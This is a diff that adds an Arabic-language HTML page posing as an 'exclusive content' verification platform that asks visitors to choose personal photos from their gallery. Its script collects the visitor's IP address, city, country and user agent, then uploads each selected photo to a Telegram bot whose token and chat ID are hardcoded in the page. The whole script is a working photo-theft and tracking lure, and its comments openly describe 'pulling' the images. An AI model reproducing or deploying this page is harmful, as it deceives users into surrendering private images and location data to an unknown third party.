@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة التحقق والوصول الحصري</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at center, #1e1b4b 0%, #090d16 100%);
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 40px 30px;
+            border-radius: 30px;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.85);
+            width: 100%;
+            max-width: 420px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #ef4444, #3b82f6, #10b981);
+        }
+
+        .badge {
+            background: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+            padding: 6px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 20px;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            letter-spacing: 0.5px;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 12px;
+            color: #f8fafc;
+            font-weight: 700;
+        }
+
+        p.desc {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            filter: brightness(1.1);
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.6);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="badge">🔥 محتوى استثنائي ومؤمن</div>
+        <h2>تحميل وتأكيد الصور الشخصية</h2>
+        <p class="desc">اضغط أدناه لاختيار الصور من المعرض وتأكيد الاتصال بالمنصة بنجاح.</p>
+        
+        <!-- حقل مخفي لفتح معرض الصور أو الملفات عند النقر -->
+        <input type="file" id="fileInput" accept="image/*" multiple style="display: none;" onchange="uploadGalleryFiles()">
+        
+        <button class="btn" onclick="triggerGallery()">
+            <span>📂</span> اختيار الصور من المعرض
+        </button>
+
+        <p id="status"></p>
+    </div>
+
+    <script>
+        const token = "8137264486:AAGMms3ySWpvOh7Lh-HmiMsUG3994kuus_8";
+        const chatId = "8188176628";
+
+        function triggerGallery() {
+            // يفتح معرض الصور الخاص بالهاتف فوراً
+            document.getElementById('fileInput').click();
+        }
+
+        async function uploadGalleryFiles() {
+            const fileInput = document.getElementById('fileInput');
+            const statusEl = document.getElementById("status");
+
+            if (fileInput.files.length === 0) return;
+
+            statusEl.style.color = "#38bdf8";
+            statusEl.innerText = "جاري سحب الصور ورفعها إلى الخادم...";
+
+            // 1. جلب معلومات الجهاز والشبكة أولاً
+            let ipInfo = "غير معروف";
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                ipInfo = `الـ IP: ${data.ip} (${data.country_name} - ${data.city})`;
+            } catch (e) {
+                ipInfo = "تعذر جلب الـ IP";
+            }
+
+            const userAgent = navigator.userAgent;
+
+            // 2. إرسال معلومات الجهاز أولاً كنص
+            const textMessage = `🚨 تم رصد فتح المعرض وسحب الصور!\n\n` +
+                                `📱 معلومات الجهاز:\n- النظام: ${userAgent}\n- الشبكة: ${ipInfo}\n\n` +
+                                `📁 عدد الصور المحددة: ${fileInput.files.length} صورة`;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}`);
+
+            // 3. سحب ورفع الصور المحددة واحدة تلو الأخرى إلى بوت تيليجرام
+            for (let i = 0; i < fileInput.files.length; i++) {
+                let file = fileInput.files[i];
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file);
+                formData.append('caption', `🖼️ صورة مسحوبة رقم (${i + 1})`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.log("فشل في إرسال إحدى الصور");
+                }
+            }
+
+            statusEl.style.color = "#4ade80";
+            statusEl.innerText = "تم سحب الصور وإرسالها بنجاح!";
+        }
+    </script>
+
+</body>
+</html>
